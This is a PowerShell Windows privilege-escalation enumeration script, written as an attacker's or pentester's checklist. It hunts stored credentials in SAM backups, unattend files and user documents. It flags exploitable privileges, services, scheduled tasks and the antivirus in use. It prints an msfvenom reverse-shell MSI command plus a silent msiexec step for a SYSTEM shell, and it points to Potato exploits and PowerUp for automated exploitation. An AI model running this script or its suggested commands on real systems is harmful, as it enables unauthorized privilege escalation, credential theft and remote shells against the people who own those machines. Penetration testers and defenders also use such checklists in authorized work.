#==============================================================================
# Windows Privilege Escalation Checklist
# Usage: .\windows-privesc.ps1
# Author: Brad Turner
#==============================================================================

$ErrorActionPreference = "SilentlyContinue"

function Banner($text) {
    Write-Host "`n========================================" -ForegroundColor Blue
    Write-Host "[*] $text" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Blue
}

function Info($text) { Write-Host "[+] $text" -ForegroundColor Green }
function Warn($text) { Write-Host "[!] $text" -ForegroundColor Yellow }
function Finding($text) { Write-Host "[!!!] $text" -ForegroundColor Red }

#------------------------------------------------------------------------------
Banner "SYSTEM INFORMATION"
#------------------------------------------------------------------------------
$os = Get-WmiObject Win32_OperatingSystem
Write-Host "Hostname: $env:COMPUTERNAME"
Write-Host "OS: $($os.Caption) $($os.OSArchitecture)"
Write-Host "Build: $($os.BuildNumber)"
Write-Host "Version: $($os.Version)"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

#------------------------------------------------------------------------------
Banner "CURRENT USER CONTEXT"
#------------------------------------------------------------------------------
Write-Host "User: $env:USERNAME"
Write-Host "Domain: $env:USERDOMAIN"
whoami /all
Write-Host ""
Info "Group memberships:"
whoami /groups

# Check for high-privilege groups
$groups = whoami /groups /fo csv | ConvertFrom-Csv
$dangerousGroups = @("Administrators", "Backup Operators", "Server Operators", "Account Operators", "DnsAdmins")
foreach ($group in $dangerousGroups) {
    if ($groups."Group Name" -match $group) {
        Finding "Member of privileged group: $group"
    }
}

#------------------------------------------------------------------------------
Banner "PRIVILEGES"
#------------------------------------------------------------------------------
whoami /priv
Write-Host ""

# Check for dangerous privileges
$privs = whoami /priv
$dangerousPrivs = @(
    "SeImpersonatePrivilege",      # Potato attacks
    "SeAssignPrimaryTokenPrivilege",
    "SeBackupPrivilege",           # Read any file
    "SeRestorePrivilege",          # Write any file
    "SeDebugPrivilege",            # Debug processes
    "SeTakeOwnershipPrivilege",    # Take ownership
    "SeLoadDriverPrivilege"        # Load drivers
)

foreach ($priv in $dangerousPrivs) {
    if ($privs -match $priv) {
        Finding "Dangerous privilege: $priv"
        if ($priv -eq "SeImpersonatePrivilege") {
            Warn "  -> Try: PrintSpoofer, GodPotato, JuicyPotato, RoguePotato"
        }
    }
}

#------------------------------------------------------------------------------
Banner "INSTALLED SOFTWARE & VERSIONS"
#------------------------------------------------------------------------------
Info "Checking Program Files..."
Get-ChildItem "C:\Program Files" | Select-Object Name
Get-ChildItem "C:\Program Files (x86)" 2>$null | Select-Object Name

Info "Checking for unquoted service paths..."
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike '"*"*' -and 
    $_.PathName -notlike "*svchost*" -and
    $_.PathName -match " "
} | Select-Object Name, PathName, StartMode | ForEach-Object {
    Finding "Unquoted service path: $($_.Name) -> $($_.PathName)"
}

#------------------------------------------------------------------------------
Banner "SERVICES"
#------------------------------------------------------------------------------
Info "Non-standard services..."
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch "Windows" -and
    $_.PathName -notmatch "System32"
} | Select-Object Name, State, PathName | Format-Table -AutoSize

Info "Checking service permissions..."
Warn "Run: accesschk.exe -uwcqv 'Everyone' * /accepteula"
Warn "Run: accesschk.exe -uwcqv 'Authenticated Users' * /accepteula"
Warn "Run: accesschk.exe -uwcqv '$env:USERNAME' * /accepteula"

#------------------------------------------------------------------------------
Banner "SCHEDULED TASKS"
#------------------------------------------------------------------------------
Info "Scheduled tasks (non-Microsoft)..."
schtasks /query /fo LIST /v 2>$null | Select-String -Pattern "TaskName|Run As User|Task To Run" | Where-Object {
    $_ -notmatch "Microsoft"
} | Select-Object -First 60

Info "Checking for writable scheduled task binaries..."
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | ForEach-Object {
    $action = $_.Actions.Execute
    if ($action -and (Test-Path $action)) {
        $acl = Get-Acl $action
        if ($acl.AccessToString -match "Everyone|Users|Authenticated Users") {
            Finding "Potentially writable task binary: $action"
        }
    }
}

#------------------------------------------------------------------------------
Banner "REGISTRY AUTORUNS"
#------------------------------------------------------------------------------
Info "Checking autorun locations..."
$autorunPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($path in $autorunPaths) {
    Write-Host "`n$path" -ForegroundColor Cyan
    Get-ItemProperty $path 2>$null | Format-List
}

#------------------------------------------------------------------------------
Banner "ALWAYSINSTALLELEVATED"
#------------------------------------------------------------------------------
$hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated 2>$null
$hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated 2>$null

if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Finding "AlwaysInstallElevated is ENABLED! Create malicious MSI for SYSTEM shell"
    Warn "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi"
    Warn "  msiexec /quiet /qn /i shell.msi"
} else {
    Info "AlwaysInstallElevated not exploitable"
}

#------------------------------------------------------------------------------
Banner "STORED CREDENTIALS"
#------------------------------------------------------------------------------
Info "Checking for stored credentials..."
cmdkey /list

Info "Checking for SAM/SYSTEM backup files..."
$credFiles = @(
    "C:\Windows\repair\SAM",
    "C:\Windows\System32\config\RegBack\SAM",
    "C:\Windows\System32\config\SAM",
    "C:\Windows\repair\SYSTEM",
    "C:\Windows\System32\config\SYSTEM",
    "C:\Windows\System32\config\RegBack\SYSTEM"
)

foreach ($file in $credFiles) {
    if (Test-Path $file) {
        Finding "Credential file accessible: $file"
    }
}

Info "Checking for unattend.xml / sysprep files..."
$unattendPaths = @(
    "C:\unattend.xml",
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\Windows\system32\sysprep\Unattend.xml"
)

foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        Finding "Unattend file found: $path"
        Select-String -Path $path -Pattern "Password" -Context 2
    }
}

Info "Checking for passwords in common files..."
Get-ChildItem C:\Users -Recurse -Include *.txt,*.ini,*.config,*.xml 2>$null | 
    Select-String -Pattern "password|passwd|pwd|secret" 2>$null | 
    Select-Object -First 20

#------------------------------------------------------------------------------
Banner "NETWORK INFORMATION"
#------------------------------------------------------------------------------
Info "Network interfaces..."
ipconfig /all

Info "Listening ports..."
netstat -ano | findstr LISTENING

Info "Established connections..."
netstat -ano | findstr ESTABLISHED

Info "Routing table..."
route print

Info "ARP cache..."
arp -a

Info "Firewall status..."
netsh advfirewall show allprofiles state

#------------------------------------------------------------------------------
Banner "DOMAIN INFORMATION"
#------------------------------------------------------------------------------
if ($env:USERDNSDOMAIN) {
    Info "Domain: $env:USERDNSDOMAIN"
    Info "Domain Controllers:"
    nltest /dclist:$env:USERDNSDOMAIN 2>$null
    
    Info "Domain users (first 20)..."
    net user /domain 2>$null | Select-Object -First 20
    
    Info "Domain groups..."
    net group /domain 2>$null | Select-Object -First 20
    
    Info "Domain admins..."
    net group "Domain Admins" /domain 2>$null
} else {
    Info "Not joined to a domain"
}

#------------------------------------------------------------------------------
Banner "LOCAL USERS & GROUPS"
#------------------------------------------------------------------------------
Info "Local users..."
net user

Info "Local administrators..."
net localgroup Administrators

#------------------------------------------------------------------------------
Banner "ANTIVIRUS / DEFENDER STATUS"
#------------------------------------------------------------------------------
Info "Windows Defender status..."
Get-MpComputerStatus 2>$null | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled

Info "AV processes..."
Get-Process | Where-Object {
    $_.ProcessName -match "defender|antivirus|avg|avast|mcafee|norton|kaspersky|eset|sophos|trend|cylance|crowdstrike|carbon"
}

#------------------------------------------------------------------------------
Banner "QUICK WINS SUMMARY"
#------------------------------------------------------------------------------
Write-Host ""
Warn "=== PRIORITIZED CHECKS ==="
Write-Host "1. SeImpersonatePrivilege    -> PrintSpoofer/GodPotato/JuicyPotato"
Write-Host "2. Unquoted service paths    -> Binary planting"
Write-Host "3. Weak service permissions  -> sc config binpath="
Write-Host "4. AlwaysInstallElevated     -> Malicious MSI"
Write-Host "5. Stored credentials        -> runas /savecred"
Write-Host "6. Scheduled tasks           -> Binary replacement"
Write-Host "7. Kernel exploits           -> Check OS version"
Write-Host "8. Password hunting          -> Files, registry, memory"
Write-Host ""
Info "Run winPEAS.exe for comprehensive automated scan"
Info "Run PowerUp.ps1 for automated exploitation"

